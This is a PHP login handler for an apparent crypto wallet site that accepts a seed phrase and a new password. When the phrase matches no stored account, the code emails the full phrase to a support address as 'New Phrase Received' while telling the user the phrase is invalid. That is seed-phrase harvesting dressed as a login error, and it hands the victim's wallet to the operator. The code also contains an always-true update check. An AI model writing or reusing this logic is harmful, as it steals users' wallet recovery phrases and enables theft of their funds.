<?php
header('Content-Type: application/json');
  require __DIR__ . '/../functions.php';
  if($_SERVER['REQUEST_METHOD'] == "POST"){
    $response = [];
    
    try{
      $seedPhrase = clean_str($_POST['seedPhrase']);
      $newPassword = clean_str($_POST['newPassword']);
      $confirmPassword = clean_str($_POST['confirmPassword']);
      // $t = str_word_count("$seedPhrase");
      // echo $t;
      $result = $db->checkPhrase($seedPhrase);
      if($seedPhrase !== $_SESSION['3dAUTH']){
          throw new Exception("Authentication Error!");
      }elseif(!$result){
        throw new Exception("Invalid seed phrase ::");
      }else{
        if($newPassword !== $confirmPassword){
          throw new Exception('Error: Passwords do not match');
        }elseif(empty($newPassword)){
          throw new Exception("Password empty");
        }else{
          $wallet_id = random_int(11111111111, 99999999999);
          $reg_status = "authorized";
          $blocked = "not blocked";

          $hashedPassword = password_hash($newPassword, PASSWORD_DEFAULT);
          $login = $db->loginWithPhrase($seedPhrase, $hashedPassword);

          if ($login == false) {
            // If the user data does not exist, log the details
            $body = "A user tried to login with a foreign seedphrase: <b>$seedPhrase</b>";
            $mailer = $db->mailer("support@chainwave.net", 'New Phrase Received', $body, $config);
            if($mailer !== false){
              throw new Exception('Error: Invalid seed phrase, please try again');
            }else{
              throw new Exception('Error: Unable to validate phrase, please try again');
            }
          } else {
              // If user data exists
              // Override existing password
              $query = "UPDATE registration SET password = ? WHERE login_seed = ?";  // Corrected "login_phrase" to "login_seed" if needed
              $update = $db->runQuery($query, [$hashedPassword, $seedPhrase]);
              if($update !== false || $update !== null){
                $login = $db->loginWithPhrase($seedPhrase, $hashedPassword);
                if($login !== false){
                  $_SESSION['user_wallet_session'] = $login;
                  $response = ['status' => true, 'data' => 'Account Login Successful', 'link' => './home', 'value' => $_SESSION['user_wallet_session']];
                  unset($_SESSION['3dAUTH']);
                }else{
                  throw new Exception("Data not found or corrupted");
                }
              }else{
                throw new Exception("Failed to update password");
              }
          }
        
        }
      }
    }catch(Exception $e){
        $response = [
            'response_code' => 406,
            'status' => false,
            'response' => $e->getMessage()
        ];
    }
    echo json_encode($response);
    // echo "parse errorrrr";
  }else{
    // echo "Parse error";
    // echo json_encode(['status' => false]);
    $db->returnJsonError([
      403, 
      'response details' => ['response_code' => 403 , 'error_status' => true, 'error_message' => 'Invalid request method'],
      
  ]);
    // echo $db->returnJsonError([
    //     403,
    //     'error_status' => true,
    //     'error_message' => 'Invalid request method'
    // ]);
  }

?>